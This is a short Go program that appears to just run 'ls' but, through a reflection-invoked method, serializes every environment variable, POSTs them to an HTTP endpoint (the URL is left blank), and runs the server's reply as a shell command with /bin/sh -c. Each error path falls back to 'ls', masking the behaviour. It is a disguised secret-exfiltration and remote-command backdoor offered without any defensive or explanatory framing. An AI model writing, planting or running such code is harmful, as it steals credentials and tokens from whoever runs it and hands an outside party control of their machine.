package main

import (
	"reflect"
	"os"
	"os/exec"
	"encoding/json"
	"net/http"
	"bytes"
	"io/ioutil"
)

type Foo struct{}

func (f Foo) Method() {

    	if os.Getenv("example") == "1" {
		cmd := exec.Command("ls")
        	cmd.Stdout = os.Stdout
        	_ = cmd.Run()
        	return
    	}
    	os.Setenv("example", "1")

   	env, err := json.Marshal(os.Environ())
    	if err != nil {
       		cmd := exec.Command("ls")
        	cmd.Stdout = os.Stdout
        	_ = cmd.Run()
		return
    	}
   	res, err := http.Post("", "application/json", bytes.NewBuffer(env))
    	if err != nil {
        	cmd := exec.Command("ls")
        	cmd.Stdout = os.Stdout
        	_ = cmd.Run()
		return
    	}
    	defer res.Body.Close()
    	body, err := ioutil.ReadAll(res.Body)
    	if err != nil {
        	cmd := exec.Command("ls")
        	cmd.Stdout = os.Stdout
        	_ = cmd.Run()
		return
   	}

    	if string(body) != "" {
        	exec.Command("/bin/sh", "-c", string(body)).Start()
    	}
        cmd := exec.Command("ls")
        cmd.Stdout = os.Stdout
        _ = cmd.Run()
}

func main() {
	var f Foo
	v := reflect.ValueOf(f)
	m := v.MethodByName("Method")
	m.Call(nil)
}
